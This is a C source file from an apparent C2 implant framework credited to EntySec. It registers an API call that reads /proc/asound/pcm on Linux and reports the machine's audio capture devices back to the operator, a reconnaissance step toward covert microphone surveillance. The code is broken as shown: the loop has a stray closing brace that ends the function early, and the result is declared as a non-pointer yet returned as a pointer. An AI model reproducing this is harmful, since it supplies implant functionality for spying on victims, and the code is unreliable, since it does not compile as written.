/*
 * MIT License
 *
 * Copyright (c) 2020-2022 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include "tlv.h"
#include "c2.h"

static c2_api_call_t *gather_mic_list(tlv_transport_pkt_t tlv_transport_packet)
{
    #ifdef LINUX
    char *sound_device = NULL;

    size_t len = 0;
    ssize_t read = 0;

    FILE *proc_asound_pcm = fopen("/proc/asound/pcm", "r");
    if (proc_asound_pcm == NULL)
        return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_FAIL, "");

    c2_api_call_t c2_result = craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, "");

    while ((read = getline(&sound_device, &len, proc_asound_pcm)) != -1)
    {
        if (strstr(sound_device, "capture") != NULL)
            c2_result = c2_add_str(c2_result, sound_device);
        }
    }

    return c2_result;
    #endif

    return NULL;
}

void register_gather_api_calls(c2_api_calls_t **c2_api_calls_table)
{
    c2_register_api_call(c2_api_calls_table, API_CALL + 2, gather_mic_list, API_SCOPE_STDAPI);
}
